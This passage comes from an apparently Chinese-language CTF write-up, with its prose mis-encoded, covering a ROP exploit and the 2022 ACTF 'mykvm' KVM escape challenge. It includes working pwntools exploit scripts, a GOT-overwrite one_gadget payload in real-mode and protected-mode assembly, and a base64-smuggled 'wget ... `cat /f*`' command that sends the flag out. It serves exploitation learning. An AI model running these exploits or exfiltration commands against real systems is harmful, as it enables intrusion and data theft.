sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------


pop_rax = 0x08059d44
add_eax_xxx = 0x08094d60 # : add eax, 0x11038 ; nop ; pop ebp ; ret
add_eax_edx = 0x0804b639 # : add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret
pop_edx = 0x0807ec72 # : pop edx ; ret
popen = 0x08071802


head = "24b401200001000000000001".decode("hex")
end =  '\x00'+"00010001".decode("hex")


pay = p32(pop_rax) + p32(0xfffef38d)
pay += p32(add_eax_xxx)+'aaaa'+p32(add_eax_edx)+'aaaa'*6
pay += p32(pop_edx) +p32(0x0809C7B2)# r
pay += p32(popen)


cmd_string = base64.b64encode("wget 127.0.0.1/`cat /f*`")
cmd = "echo {} | base64 -d | sh".format(cmd_string)


payload = head
payload += ("\x3f"+'a'*0x3f)*14+"\x04aaaa"
payload += '\x3f'+ pay.ljust(0x3f,'a') # 0x385+0x40=0x3c5  0x11038+0xfffef38d=0x3c5
payload += chr(len(cmd)).encode()+ cmd
payload += end

# # print(hex(len(pay))) 0x38

s(payload)


ia()
```


### 2022ACTF mykvm

ä¸€é“kvmçš„é¢˜ç›®

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231228191717.png)

ä¸»å‡½æ•°ä¼šmallocä¸€ä¸ª0x20çš„å †å—æ”¾ç½®åœ¨bssæ®µä¸Šä»¥å­˜å‚¨hostname

ç„¶åå°±æ˜¯è¾“å…¥codeä»£ç ï¼Œä»¥åŠguest name å’Œ guest passwd ï¼Œç„¶åè¿›å…¥ä¸€ä¸ªKVMçš„å‡½æ•°å®ç°è™šæ‹Ÿæœºæ‰§è¡Œå‘½ä»¤

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231228191749.png)

kvmå‡½æ•°å¦‚ä¸‹ï¼Œkvmçš„å¯åŠ¨å¯ä»¥å‚ç…§APIæ–‡æ¡£ï¼Œhttps://lwn.net/Articles/658511/ï¼Œå…¶ä¸­æ¶‰åŠå¾ˆå¤šå®çš„ä½¿ç”¨

```c
KVM_CREATE_VM 0xae01
KVM_SET_USER_MEMORY_REGION 0x4020ae46
KVM_CREATE_VCPU 0xae41
KVM_GET_VCPU_MMAP_SIZE 0xae04
KVM_GET_REGS 0x8090ae81
KVM_SET_REGS 0x4090ae82
KVM_GET_SREGS 0x8138ae83
KVM_SET_SREGS 0x4138ae84
KVM_RUN 0xae80
```


```c
unsigned __int64 __fastcall sub_400B92(const void *code, size_t codesize)
{
  int kvmfd; // [rsp+10h] [rbp-220h]
  int vmfd; // [rsp+14h] [rbp-21Ch]
  int vcpu; // [rsp+1Ch] [rbp-214h]
  size_t vcpu_mmap_size; // [rsp+30h] [rbp-200h]
  kvm_run *run_mem; // [rsp+38h] [rbp-1F8h]
  kvm_userspace_memory_region region; // [rsp+40h] [rbp-1F0h] BYREF
  char v9[48]; // [rsp+60h] [rbp-1D0h] BYREF
  __int64 v10; // [rsp+90h] [rbp-1A0h]
  kvm_regs guest_regs; // [rsp+E0h] [rbp-150h] BYREF
  unsigned __int64 v12; // [rsp+228h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  kvmfd = open("/dev/kvm", 0x80002); //è¿™éƒ¨åˆ†ä»£ç æ‰“å¼€ /dev/kvm è®¾å¤‡ï¼Œè·å– KVM æ–‡ä»¶æè¿°ç¬¦ã€‚å¦‚æœæ‰“å¼€å¤±è´¥ï¼Œç¨‹åºå°†é€€å‡ºã€‚
  if ( kvmfd == -1 )
    errx(1, "failed to open /dev/kvm");
  vmfd = ioctl(kvmfd, 0xAE01uLL, 0LL); //ä½¿ç”¨ ioctl ç³»ç»Ÿè°ƒç”¨å’ŒKVM æ–‡ä»¶æè¿°ç¬¦æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„è™šæ‹Ÿæœºï¼Œå¹¶è·å–è™šæ‹Ÿæœºçš„æ–‡ä»¶æè¿°ç¬¦ã€‚
  memcpy(
    (&unk_602100 - (((((&unk_602100 >> 31) >> 20) + &unk_602100) & 0xFFF) - ((&unk_602100 >> 31) >> 20)) + 4096),// 0x603000
    code,
    codesize);// è¿™é‡Œæ˜¯è®©å‡½æ•°åœ°å€å–æ•´ï¼Œ0x602100 -> 0x603000
  region.slot = 0; // è®¾ç½®ä¸€ä¸ªå†…å­˜åŒºåŸŸï¼ˆkvm_userspace_memory_regionï¼‰ï¼ŒåŒ…æ‹¬è™šæ‹Ÿæœºå†…çš„ç‰©ç†åœ°å€ã€å¤§å°ä»¥åŠå¯¹åº”çš„ç”¨æˆ·ç©ºé—´åœ°å€ã€‚è¿™ä¸ªå†…å­˜åŒºåŸŸéšåé€šè¿‡ ioctl è°ƒç”¨æ·»åŠ åˆ°è™šæ‹Ÿæœºä¸­ã€‚
  region.flags = 0;
  region.guest_phys_addr = 0LL;
  region.memory_size = 0x40000000LL;
  region.userspace_addr = (&unk_602100
                         - (((((&unk_602100 >> 31) >> 20) + &unk_602100) & 0xFFF)
                          - ((&unk_602100 >> 31) >> 20))
                         + 4096);
  ioctl(vmfd, 0x4020AE46uLL, &region);
  vcpu = ioctl(vmfd, 0xAE41uLL, 0LL); //åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿ CPU å¹¶è·å–ç›¸å…³çš„ä¿¡æ¯ï¼Œå¦‚ mmap å¤§å°ï¼Œç„¶åå°†å…¶æ˜ å°„åˆ°å†…å­˜ä¸­ã€‚ vcpuä½œç”¨äºå®æ¨¡å¼
  vcpu_mmap_size = ioctl(kvmfd, 0xAE04uLL, 0LL);
  run_mem = mmap(0LL, vcpu_mmap_size, 3, 1, vcpu, 0LL);
  ioctl(vcpu, 0x8090AE81uLL, v9); // åˆå§‹åŒ–è™šæ‹Ÿ CPU çš„å¯„å­˜å™¨å€¼ã€‚
  guest_regs.rax = 0LL;
  v10 = 0x4000LL;
  guest_regs.rbx = 2LL;
  ioctl(vcpu, 0x4090AE82uLL, v9); // è®¾ç½®è™šæ‹ŸCPUçš„å€¼
  ioctl(vcpu, 0x8138AE83uLL, &guest_regs.rcx); //è·å–sregsçš„å€¼
  WORD2(guest_regs.rdx) = 0;
  guest_regs.rcx = 0LL;
  ioctl(vcpu, 0x4138AE84uLL, &guest_regs.rcx); //è®¾ç½®sregsçš„å€¼
  while ( 1 )
  {
    ioctl(vcpu, 0xAE80uLL, 0LL); //è¿™æ˜¯å‡½æ•°çš„æ ¸å¿ƒå¾ªç¯ï¼Œå®ƒä¸æ–­è¿è¡Œè™šæ‹Ÿæœºå¹¶æ ¹æ®ä¸åŒçš„é€€å‡ºåŸå› ï¼ˆä¾‹å¦‚ I/O æ“ä½œã€HLT æŒ‡ä»¤ç­‰ï¼‰è¿›è¡Œå¤„ç†ã€‚
    switch ( run_mem->exit_reason )
    {
      case 2u:
        putchar(*(&run_mem->request_interrupt_window + run_mem->io.data_offset));
        break;
      case 5u:
        fwrite("KVM_EXIT_HLT\n", 1uLL, 0xDuLL, stderr);
        return __readfsqword(0x28u) ^ v12;
      case 8u:
        errx(1, "KVM_EXIT_SHUTDOWN");
      case 9u:
        errx(1, "KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx", run_mem->hw.hardware_exit_reason);
      case 0x11u:
        errx(1, "KVM_EXIT_INTERNAL_ERROR: suberror = 0x%x", run_mem->ex.exception);
      default:
        errx(1, "Unhandled reason: %d", run_mem->exit_reason);
    }
  }
}
```

ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¾“å…¥çš„codeä¼šä»æ ˆä¸Šmemcpyåˆ°bssæ®µçš„0x603000ä¸Šï¼Œè€Œè¿™ä¸ª0x603000åˆä¼šè¢«KVMå½“ä½œå†…å­˜çš„å¼€å§‹ï¼Œæˆ‘çš„codeå°±ç±»ä¼¼äºBIOSçš„å­˜åœ¨ã€‚

è¿™éƒ¨åˆ†å»ºè®®é˜…è¯»
ç”µè„‘æ˜¯å¦‚ä½•å¯åŠ¨çš„ï¼š<https://www.ruanyifeng.com/blog/2013/02/booting.html>

é‚£ä¹ˆæ¼æ´ç‚¹åœ¨å“ªå‘¢ï¼Œä¸»è¦æœ‰å‡ å¤„
1ã€é¦–å…ˆæ˜¯è™šæ‹Ÿæœºçš„å†…å­˜å¤§å°è®¾ç½®ä¸º0x40000000ï¼Œè€Œ0x603000~0x603000+0x40000000åŒ…å«äº†./mykvm(ä¸»ç¨‹åº)çš„å †åœ°å€ï¼Œè¿™å°±å¯¼è‡´è™šæ‹Ÿæœºèƒ½è®¿é—®ä¸»ç¨‹åºå †åœ°å€çš„å†…å®¹
2ã€ç”±äºæ˜¯å®æ¨¡å¼16ä½å¯»å€ï¼Œå³2å­—èŠ‚ï¼Œå®æ¨¡å¼åˆ©ç”¨ä¸€ç§ç§°ä¸º"æ®µ:åç§»"çš„æ–¹å¼æ¥æ‰©å±•å¯»å€èƒ½åŠ›ï¼Œæœ€å¤§èƒ½å¤Ÿå¯»å€1MBï¼ˆ2^20å­—èŠ‚ï¼‰çš„ç‰©ç†å†…å­˜ï¼Œä¹Ÿå°±æ˜¯20ä½å¯»å€ï¼Œ0x00000 åˆ° 0xFFFFFã€‚æ„å‘³ç€è™šæ‹Ÿæœºå®é™…èƒ½æ“ä½œçš„èŒƒå›´ä¸º0x603000~0x603000+0xFFFFFï¼Œè¿™ä»ç„¶å¯èƒ½åŒ…æ‹¬å †åœ°å€ï¼Œå †ä¸­ä¼šæœ‰ä¸€äº›main_arenaçš„åœ°å€
3ã€readlineå‡½æ•°æ˜¯libreadline.so.6ä¸­çš„ä¸€ä¸ªåº“å‡½æ•°
```c
void *__fastcall sub_400F28(__int64 a1)
{
  if ( ptr )
  {
    free(ptr);
    ptr = 0LL;
  }
  ptr = (void *)readline(a1);
  if ( ptr && *(_BYTE *)ptr )
    add_history((__int64)ptr);
  return ptr;
}
```

readline() çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¼šå…ˆè¾“å‡ºå†è¯»å–ä¸€è¡Œè¾“å…¥ï¼Œç„¶åè¿”å›ä¸€ä¸ªå †å—æŒ‡é’ˆã€‚åŸåˆ™ä¸Šéœ€è¦freeã€‚è¿™é‡Œä¹Ÿæ²¡æœ‰freeï¼Œè¿ç»­ä¸‰æ¬¡çš„readline()å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªå †å—ï¼Œç»“åˆæˆ‘ä»¬è™šæ‹Ÿæœºèƒ½æ“ä½œä¸»ç¨‹åºå †æ®µçš„æ¼æ´ï¼Œå°±å¯ä»¥æ§åˆ¶è¾“å…¥çš„å†…å®¹(æœ¬æ¥å¯ä»¥ç”¨æˆ·æ§åˆ¶ï¼Œè¿™é‡Œæ˜¯æŒ‡è™šæ‹Ÿæœºæ§åˆ¶)ã€‚readline()å‡½æ•°ä¼šå°†\x7fä½œä¸ºDeleteä¿¡å·è¯†åˆ«ï¼Œæ‰€ä»¥è¾“å…¥çš„å†…å®¹è¦æ§åˆ¶æ²¡æœ‰"7f"

4ã€ä¸»å‡½æ•°é‡Œè¯»å…¥codeçš„æ—¶å€™é‡‡ç”¨scanfè¯»å…¥ï¼ŒåŸåˆ™ä¸Šè¿™æ®µcodeä¼šè¢«è¯»å…¥æ ˆä¸Šï¼Œç„¶åè¢«memcpyåˆ°0x603000ï¼Œè€Œmemcpyä¸ä¼šè¢«é›¶æˆªæ–­ï¼Œè¿™æ ·ä»¥æ¥æ ˆä¸Šçš„ä¸€äº›å€¼å°±ä¼šè¢«æ”¾åˆ°bssé‡Œ
```c
    puts("your code size: ");
    __isoc99_scanf("%d", codesize);
    if ( codesize[0] <= 4096 )
```


è¿™é‡Œè®²ä¸€ä¸‹é¢˜ç›®çš„å¯åŠ¨å’Œè°ƒè¯•ï¼Œç”±äºé¢˜ç›®ç»™äº†dockerç¯å¢ƒï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨dockerè¿›è¡Œè°ƒè¯•

```shell
docker build -t mykvm .
docker run --privileged --rm -p 8000:8888 -p 1234:1234 -d  mykvm:latest
# --privilegedå‚æ•°ç”¨äºæ”¯æŒKVM
è¿è¡Œå¸¦æœ‰pause()çš„è„šæœ¬

sudo gdb -p `pidof mykvm`
```


é¦–å…ˆæ˜¯æ³„éœ²libcï¼Œå¦‚æœæ³„éœ²ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œé€šè¿‡outæŒ‡ä»¤å®ç°ï¼Œè¿™ä¹Ÿç®—æ˜¯å®˜æ–¹WPçš„å®ç°<https://github.com/team-s2/ACTF-2022/blob/main/pwn/mykvm/exploits/exp.py>

```python
shellcode = asm('''
    .code16
    mov al, 0x57  ;"W"
    mov dx, 0x217 ;è¿™é‡Œæµ‹è¯•ä¸ºä»»ä½•å€¼éƒ½å¯ä»¥
    out dx, al
    mov al, 10 ;"/n"
    out dx, al
    hlt
''')
```

è¯»ç«¯å£ç”¨INæŒ‡ä»¤ï¼Œå†™ç«¯å£ç”¨OUTæŒ‡ä»¤

```c
IN AL,21Hï¼›è¡¨ç¤ºä»21Hç«¯å£è¯»å–ä¸€å­—èŠ‚æ•°æ®åˆ°AL

IN AX,21Hï¼›è¡¨ç¤ºä»ç«¯å£åœ°å€21Hè¯»å–1å­—èŠ‚æ•°æ®åˆ°ALï¼Œä»ç«¯å£åœ°å€22Hè¯»å–1å­—èŠ‚åˆ°AH

MOV DX,379H
IN AL,DX ï¼›ä»ç«¯å£379Hè¯»å–1å­—èŠ‚åˆ°AL


OUT 21H,ALï¼›å°†ALçš„å€¼å†™å…¥21Hç«¯å£
OUT 21H,AXï¼›å°†AXçš„å€¼å†™å…¥ç«¯å£åœ°å€21Hå¼€å§‹çš„è¿ç»­ä¸¤ä¸ªå­—èŠ‚ã€‚ï¼ˆport[21H]=AL,port[22h]=AHï¼‰

MOV DX,378H
OUT DX,AX ï¼›å°†AHå’ŒALåˆ†åˆ«å†™å…¥ç«¯å£379Hå’Œ378H
```

è¿™é‡Œè¦è€ƒè™‘å¦‚ä½•å»æœ€ç»ˆè·å–shellï¼Œç»“åˆgotè¡¨å¯å†™å’Œlibc-2.23ï¼Œå¯ä»¥è€ƒè™‘åŠ«æŒgotè¡¨ä¸ºone_gadgetï¼Œæ¯”å¦‚putsï¼Œåœ¨ä¸»ç¨‹åºçš„æœ€åä¼šè¾“å…¥hostnameå¯¹ä¸»ç¨‹åºbssæ®µä¸Šçš„destå˜é‡è¿›è¡Œå†™å…¥ï¼Œé‚£æ˜¯ä¸€ä¸ªbssæ®µå˜é‡

```c
      memcpy(dest, *&codesize[1], 0x20uLL);
      puts("Bye!");
```

è¿™é‡Œçœ‹ä¸€ä¸‹memcpyçš„åŸå‹ï¼Œå…¶å‚æ•°ä¸º2ä¸ªæŒ‡é’ˆï¼Œæ„å‘³ç€æ•°æ®ä¼šè¢«copyåˆ°destæŒ‡å‘çš„å †å—ä¸­

```c
void *memcpy(void *dest, const void *src, size_t n);
```

è€Œdest 0x60A100æ­£å¥½åœ¨è™šæ‹Ÿæœºå†…å­˜èŒƒå›´å†…ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶æ”¹ä¸ºgotè¡¨çš„åœ°å€ï¼Œç„¶åå†ç¯¡æ”¹è¯»readlineè¯»å…¥å †å—é‡Œçš„å†…å®¹(å®æµ‹åªä¼šæ¸…ç©ºå‰8å­—èŠ‚çš„å†…å®¹)ï¼Œè¿™æ ·å°±èƒ½ä¿®æ”¹äº†ã€‚
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231229110828.png)
å†™æ±‡ç¼–çš„æ€è·¯ï¼š
å…ˆæ‹¿ä¸€ä¸ªå †åœ°å€æ£€æµ‹æ˜¯å¦å †æ®µåœ¨1MèŒƒå›´å†…ï¼Œåœ¨çš„è¯å°±æ‰§è¡Œåç»­payloadï¼Œä¸åœ¨å°±æ§åˆ¶è¾“å‡ºæ¥å¯¼å‘æ–°çš„remote
å…ˆå»æ ˆä¸Šæ‹¿ä¸€ä¸ªlibcåœ°å€ï¼Œç„¶åæ”¾åˆ°bssæ®µä¸Š
ç„¶åå†å»æ‹¿destå †å—çš„åœ°å€ï¼Œè¿™ä¸ªåœ¨bssæ®µä¸Šï¼Œé€šè¿‡å­—ç¬¦ä¸²æœç´¢æœç´¢åˆ°å¯¹åº”çš„readlineå †å—çš„åœ°å€ï¼Œå¤„ç†åä¹Ÿæ”¾åˆ°bssæ®µä¸Š
ç„¶åè®¡ç®—å‡ºone_gadgetçš„åœ°å€ï¼Œå°†å…¶èµ‹å€¼ç»™readlineå †å—+8ï¼Œå†å°†destçš„å€¼æ¢æˆputcharçš„gotè¡¨åœ°å€
è¿™é‡Œåœ¨å¯¹readlineå †å—+8å †å—èµ‹å€¼æ—¶ï¼Œç”±äºå®æµ‹è¿™ä¸ªåœ°å€å¤§æ¦‚ä¸º0x0157f8(KVMåœ°å€)ï¼Œè¶…è¿‡äº†å®æ¨¡å¼2å­—èŠ‚çš„å¯»å€èŒƒå›´ï¼Œæ‰€ä»¥è¦ç”¨dsæ®µå¯„å­˜å™¨è¿›è¡Œå¯»å€

EXP

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("127.0.0.1",8000) #typ="udp"
# p = process("./bin/mykvm")
# elf = ELF("./mykvm")
# libc = elf.libc

# context.log_level = "debug" # info
# context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

p = remote("127.0.0.1",8000)

# libc in stack
# heap_input
# heap+8 in kvm
# got

code = asm('''
    .code16gcc
    jmp main
    .rept 40
    .byte 0x00
    .endr

main:
    mov eax,[0x7100]   
    sub eax,0x603000
    cmp eax,0xfd800
    jb next
    mov ebx,0
    div eax,ebx 

next:
    mov ebx, [0x568]
    add ebx,0x2270cf
    mov [0x7200], ebx
    mov ebx,[0x56c]
    mov [0x7204], ebx

    mov ebx,[0x7100]
    add ebx,0x27e0
    mov [0x7220],ebx

    mov edx,[0x7200]
    add edx,0x4527a	
    push edx

    add ebx,0x8	
    sub ebx,0x603000
    mov eax,ebx

    shr eax,16
    shl eax,12
    mov ds,eax			
    pop edx
    mov ds:[bx],edx

    mov ebx,0x602020
    mov eax,0
    mov ds,eax
    mov [0x7100],ebx
    hlt
''')


c = 1
while c:
    # pause()
    sla("your code size: ",4096)
    sla("your code:",code)
    sla("guest name:",'e4l4')
    sla("guest passwd:",'e4l4')
    # sla("host name: ",'e4l4')
    p.recvline()
    ret = r(0x1b)
    if "mykvm" not in ret:
	    # pause()
        c = 0
        print("got it!!!")
        sl("e4l4")
        break        
    p.close()
    p = remote("127.0.0.1",8000)
    
ia()
```

å®˜æ–¹çš„é¢˜è§£æ˜¯ä»16ä½å®æ¨¡å¼åˆ‡æ¢åˆ°32ä½ä¿æŠ¤æ¨¡å¼å†è¿›è¡Œåˆ©ç”¨ï¼Œè¿™é‡Œä¹Ÿè¿›è¡Œè¿›ä¸€æ­¥çš„å­¦ä¹ 
ä»€ä¹ˆæ˜¯å®æ¨¡å¼å’Œä¿æŠ¤æ¨¡å¼ï¼š<https://www.cnblogs.com/kelamoyujuzhen/p/10555924.html>
linuxåˆ†é¡µçš„æœºåˆ¶ï¼š<https://zhuanlan.zhihu.com/p/458935522>
è¯¦ç»†å†…å®¹å‚è€ƒï¼š16ä½å®æ¨¡å¼åˆ‡æ¢32ä½ä¿æŠ¤æ¨¡å¼è¿‡ç¨‹è¯¦è§£:https://bbs.kanxue.com/thread-269223.htm


> [!NOTE] ç¬”è®°
> 16ä½å¯»å€ 2å­—èŠ‚ 0x1234  20ä½ 0x1234567
> 32ä½å¯»å€ 4å­—èŠ‚ 0x12345678
> 3ä¸ª16è¿›åˆ¶æ•°èƒ½è¡¨ç¤ºçš„èŒƒå›´æ­£å¥½å°±æ˜¯4KBï¼Œå³ä¸€é¡µ
> é€»è¾‘åœ°å€ â€“[åˆ†æ®µ]â€“ã€‹ çº¿æ€§åœ°å€ â€“[åˆ†é¡µ]â€“ã€‹ ç‰©ç†åœ°å€
> 
> 
> 

ä¸¤ä¸ªè¿›ç¨‹è™šæ‹Ÿåœ°å€ç›¸åŒï¼Œæ˜ å°„çš„ç‰©ç†åœ°å€ä¹Ÿæ˜¯ä¸åŒçš„

```
è™šæ‹Ÿå†…å­˜:  [é¡µ0] [é¡µ1] [é¡µ2] [é¡µ3]
ç‰©ç†å†…å­˜: [é¡µA] [é¡µB] [é¡µC] [é¡µD]


é¡µè¡¨:
| è™šæ‹Ÿé¡µå· | ç‰©ç†é¡µå· | æ ‡å¿— |
|----------|----------|------|
|    0     |    B     |  RW  |
|    1     |    A     |  R   |
|    2     |    D     |  RW  |
|    3     |    C     |  R   |
```

æ®µæ ‡è¯†ç¬¦é•¿8å­—èŠ‚ï¼Œ16ä½å®æ¨¡å¼é€šè¿‡GDTå…¨å±€æè¿°ç¬¦è¡¨å¯»å€ï¼Œ16ä½æ­£å¥½è¡¨ç¤ºä¸‹æ ‡

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231228134405.png)

ä¸€èˆ¬ä¼šåœ¨MBR(â€è¿™æœ€å‰é¢çš„512ä¸ªå­—èŠ‚ï¼Œå°±å«åš"ä¸»å¼•å¯¼è®°å½•"ï¼ˆMaster boot recordï¼Œç¼©å†™ä¸ºMBRï¼‰â€œ)è½½å…¥å¯åŠ¨ç®¡ç†å™¨ä¸­è¿›è¡Œå®æ¨¡å¼åˆ°ä¿æŠ¤æ¨¡å¼çš„åˆ‡æ¢ã€‚ç„¶åå°±èƒ½è£…è½½åŠ è½½å†…æ ¸çš„ç¨‹åºäº†
ä»å®æ¨¡å¼åˆ‡æ¢åˆ°ä¿æŠ¤æ¨¡å¼å¤§è‡´å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š
å±è”½ä¸­æ–­
åˆå§‹åŒ–å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰
å°†CR0å¯„å­˜å™¨æœ€ä½ä½ç½®1
æ‰§è¡Œè¿œè·³è½¬
åˆå§‹åŒ–æ®µå¯„å­˜å™¨å’Œæ ˆæŒ‡é’ˆ

å®é™…ä¸Šå¯ä»¥ç®€åŒ–ä¸ºä¸€ä¸ªæ¨¡æ¿
```c
org 0 
cli                     ; å±è”½ä¸­æ–­
 
lgdt [gdt_descriptor]   ; åˆå§‹åŒ–GDT
 
; æŠŠ cr0 çš„æœ€ä½ä½ç½®ä¸º 1ï¼Œå¼€å¯ä¿æŠ¤æ¨¡å¼
mov eax, cr0
or eax, 0x1
mov cr0, eax
jmp 08h:PModeMain
 
[bits 32]
PModeMain:
    mov ax, 0x10        ; å°†æ•°æ®æ®µå¯„å­˜å™¨dså’Œé™„åŠ æ®µå¯„å­˜å™¨esç½®ä¸º0x10
    mov ds, ax         
    mov es, ax
    mov fs, ax          ; fså’Œgså¯„å­˜å™¨ç”±æ“ä½œç³»ç»Ÿä½¿ç”¨ï¼Œè¿™é‡Œç»Ÿä¸€è®¾æˆ0x10
    mov gs, ax
    mov ax, 0x18        ; å°†æ ˆæ®µå¯„å­˜å™¨ssç½®ä¸º0x18
    mov ss, ax
    mov ebp, 0x7c00     ; ç°åœ¨æ ˆé¡¶æŒ‡å‘ 0x7c00
    mov esp, ebp

	xxx
    hlt

gdt_start:
; ç¬¬ä¸€ä¸ªæè¿°ç¬¦å¿…é¡»æ˜¯ç©ºæè¿°ç¬¦
gdt_null:
    dd 0
    dd 0
; ä»£ç æ®µæè¿°ç¬¦
gdt_code:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10011010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; æ•°æ®æ®µæè¿°ç¬¦
gdt_data:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; æ ˆæ®µæè¿°ç¬¦
gdt_stack:
    dw 0x7c00 ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 01000000b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
gdt_end:
 
; GDT descriptior
gdt_descriptor:
dw gdt_end - gdt_start - 1 ; Size of our GDT, always less one of the true size
dd gdt_start ; Start address of our GDT
```

è§£é™¤äº†å¯»å€ä¸º1Mçš„é™åˆ¶ï¼Œä¹Ÿå°±ä¸ç”¨å†çˆ†ç ´åœ°å€äº†,ä¹Ÿèƒ½ç›´æ¥èµ‹å€¼ç»™0x1f5bb58è¿™æ ·çš„åœ°å€äº†

exp.asm
```c
org 0 
cli                     ; å±è”½ä¸­æ–­
 
lgdt [gdt_descriptor]   ; åˆå§‹åŒ–GDT
 
; æŠŠ cr0 çš„æœ€ä½ä½ç½®ä¸º 1ï¼Œå¼€å¯ä¿æŠ¤æ¨¡å¼
mov eax, cr0
or eax, 0x1
mov cr0, eax
jmp 08h:PModeMain
times 40 db 0x00
; .endr

[bits 32]
PModeMain:
    mov ax, 0x10        ; å°†æ•°æ®æ®µå¯„å­˜å™¨dså’Œé™„åŠ æ®µå¯„å­˜å™¨esç½®ä¸º0x10
    mov ds, ax         
    mov es, ax
    mov fs, ax          ; fså’Œgså¯„å­˜å™¨ç”±æ“ä½œç³»ç»Ÿä½¿ç”¨ï¼Œè¿™é‡Œç»Ÿä¸€è®¾æˆ0x10
    mov gs, ax
    mov ax, 0x18        ; å°†æ ˆæ®µå¯„å­˜å™¨ssç½®ä¸º0x18
    mov ss, ax
    mov ebp, 0x7c00     ; ç°åœ¨æ ˆé¡¶æŒ‡å‘ 0x7c00
    mov esp, ebp

    mov ebx, [0x7100]
    add ebx, 0x1b48
    sub ebx, 0x603000
    mov edx, [ebx]		
    sub edx, 0x3c51a8	
    add edx, 0x4527a	; gadget addr
        
    mov  [0x7200], edx
        
    mov ebx, [0x7100]
    add ebx, 0x27e0		; target &nbytes addr
    add ebx, 0x8
    sub ebx, 0x603000	; memcpy arg1 -> &nbytes

    ; pop edx
    mov  edx, [0x7200]
    mov [ebx], edx      ; gadget to &nbytes

    mov ecx, 0x602020
    mov [0x7100],ecx        ; memcpy arg0 -> 0x602020
    hlt


gdt_start:
; ç¬¬ä¸€ä¸ªæè¿°ç¬¦å¿…é¡»æ˜¯ç©ºæè¿°ç¬¦
gdt_null:
    dd 0
    dd 0
; ä»£ç æ®µæè¿°ç¬¦
gdt_code:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10011010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; æ•°æ®æ®µæè¿°ç¬¦
gdt_data:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; æ ˆæ®µæè¿°ç¬¦
gdt_stack:
    dw 0x7c00 ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 01000000b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
gdt_end:
 
; GDT descriptior
gdt_descriptor:
dw gdt_end - gdt_start - 1 ; Size of our GDT, always less one of the true size
dd gdt_start ; Start address of our GDT
```

exp.py
```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
